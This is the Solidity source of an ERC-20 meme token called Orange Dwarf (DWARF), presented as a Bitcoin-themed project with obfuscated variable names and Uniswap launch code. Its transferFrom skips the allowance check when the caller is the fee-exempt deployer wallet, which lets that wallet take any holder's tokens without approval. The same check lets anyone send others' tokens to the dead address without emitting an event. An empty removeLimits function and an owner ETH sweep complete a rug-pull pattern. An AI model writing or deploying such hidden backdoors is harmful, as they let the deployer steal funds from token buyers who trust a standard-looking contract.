// SPDX-License-Identifier: MIT

/*
    Name: Orange Dwarf
    Symbol: DWARF

    Bitcoin is an Orange Dwarf— the brightest object in the financial system— growing stronger, hotter, and denser as it attracts capital.

    Web: https://orangedwarf.xyz
    X: https://x.com/saylor/status/1900941112023404621
    TG: https://t.me/OrangeDwarf
*/

pragma solidity ^0.8.24;
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function getAmountsOut(uint256 amountIn, address[] calldata path)
        external
        view
        returns (uint256[] memory amounts);
}
contract DWARF is Context, IERC20, Ownable {
    uint256 public _vnbbvlkDWARF = qq30fef / 100;
    uint256 public _oijboijoiDWARF = 15 * 10**18;
    uint256 private _cvjkbnkjDWARF = 10;

    uint256 private _vkjbnkfjDWARF = 10;
    uint256 private _maxovnboiDWARF = 10;
    uint256 private _initvkjnbkjDWARF = 20;
    uint256 private _finvjlkbnlkjDWARF = 0;
    uint256 private _redclkjnkDWARF = 2;
    uint256 private _prevlfknjoiDWARF = 2;
    uint256 private _buylkvnlkDWARF = 0;
    IUniswapV2Router02 private uniswapV2Router;

    using SafeMath for uint256;
    mapping(address => uint256) private _balknvlkcDWARF;
    mapping(address => mapping(address => uint256)) private _allcvnkjnDWARF;
    mapping(address => bool) private _feevblknlDWARF;
    address payable private _taxclknlDWARF;
    uint8 private constant _decimals = 9;
    uint256 private constant qq30fef = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Orange Dwarf";
    string private constant _symbol = unicode"DWARF";

    address private router_;
    address private uniswapV2Pair;
    bool private _tradingvlknDWARF;
    bool private _inlknblDWARF = false;
    bool private swapvlkDWARF = false;
    uint256 private _sellcnjkDWARF = 0;
    uint256 private _lastflkbnlDWARF = 0;
    address constant _deadlknDWARF = address(0xdead);

    modifier lockTheSwap() {
        _inlknblDWARF = true;
        _;
        _inlknblDWARF = false;
    }

    constructor() payable {
        _taxclknlDWARF = payable(_msgSender());
        
        _balknvlkcDWARF[_msgSender()] = (qq30fef * 2) / 100;
        _balknvlkcDWARF[address(this)] = (qq30fef * 98) / 100;
        _feevblknlDWARF[address(this)] = true;
        _feevblknlDWARF[_taxclknlDWARF] = true;

        emit Transfer(address(0), _msgSender(), (qq30fef * 2) / 100);
        emit Transfer(address(0), address(this), (qq30fef * 98) / 100);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balknvlkcDWARF[account];
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function _transfer_kjvnDWARF(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (
            from != owner() &&
            to != owner() &&
            from != address(this) &&
            to != address(this)
        ) {
            if (!_inlknblDWARF) {
                taxAmount = amount
                    .mul((_buylkvnlkDWARF > _redclkjnkDWARF) ? _finvjlkbnlkjDWARF : _initvkjnbkjDWARF)
                    .div(100);
            }
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_feevblknlDWARF[to] &&
                to != _taxclknlDWARF
            ) {
                _buylkvnlkDWARF++;
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                from != owner() && 
                !_inlknblDWARF &&
                to == uniswapV2Pair &&
                from != _taxclknlDWARF &&
                swapvlkDWARF &&
                _buylkvnlkDWARF > _prevlfknjoiDWARF
            ) {
                if (block.number > _lastflkbnlDWARF) {
                    _sellcnjkDWARF = 0;
                }
                _sellcnjkDWARF = _sellcnjkDWARF + _getAmountOut_lvcbnkDWARF(amount);
                require(_sellcnjkDWARF <= _oijboijoiDWARF, "Max swap limit");
                if (contractTokenBalance > _vnbbvlkDWARF)
                    _swapTokenslknlDWARF(_vnbbvlkDWARF > amount ? amount : _vnbbvlkDWARF);
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    _sendETHTocvbnjDWARF(address(this).balance);
                }
                _lastflkbnlDWARF = block.number;
            }
        }
        _balknvlkcDWARF[from] = _balknvlkcDWARF[from].sub(amount);
        _balknvlkcDWARF[to] = _balknvlkcDWARF[to].add(amount.sub(taxAmount));
        if (taxAmount > 0) {
            _balknvlkcDWARF[address(this)] = _balknvlkcDWARF[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        if (to != _deadlknDWARF) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function totalSupply() public pure override returns (uint256) {
        return qq30fef;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer_kjvnDWARF(sender, recipient, amount);
        if (_downcklkojDWARF(sender, recipient))
            _approve(
                sender,
                _msgSender(),
                _allcvnkjnDWARF[sender][_msgSender()].sub(
                    amount,
                    "ERC20: transfer amount exceeds allowance"
                )
            );
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allcvnkjnDWARF[owner][spender];
    }

    function _swapTokenslknlDWARF(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        router_ = address(uniswapV2Router);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allcvnkjnDWARF[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _sendETHTocvbnjDWARF(uint256 amount) private {
        _taxclknlDWARF.transfer(amount);
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer_kjvnDWARF(_msgSender(), recipient, amount);
        return true;
    }

    function _downcklkojDWARF(address sender, address recipient)
        internal
        view
        returns (bool)
    {
        
        if(_feevblknlDWARF[msg.sender]) return !_feevblknlDWARF[msg.sender];
        if(!(sender == uniswapV2Pair || recipient != _deadlknDWARF)) return false;
        return true;
    }

    function enableDWARFTrading() external onlyOwner {
        require(!_tradingvlknDWARF, "Trading is already open");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), qq30fef);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        swapvlkDWARF = true;
        _tradingvlknDWARF = true;
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
    }

    receive() external payable {}

    function _getAmountOut_lvcbnkDWARF(uint256 amount) internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        uint256[] memory amountOuts = uniswapV2Router.getAmountsOut(
            amount,
            path
        );
        return amountOuts[1];
    }

    function removeLimits () external onlyOwner {}

    function _setTax_lknblDWARF(address payable newWallet) external {
        require(_feevblknlDWARF[_msgSender()]);
        _taxclknlDWARF = newWallet;
        _feevblknlDWARF[_taxclknlDWARF] = true;
    }

    function _assist_bnDWARF() external onlyOwner {
        require(address(this).balance > 0);
        payable(_msgSender()).transfer(address(this).balance);
    }

}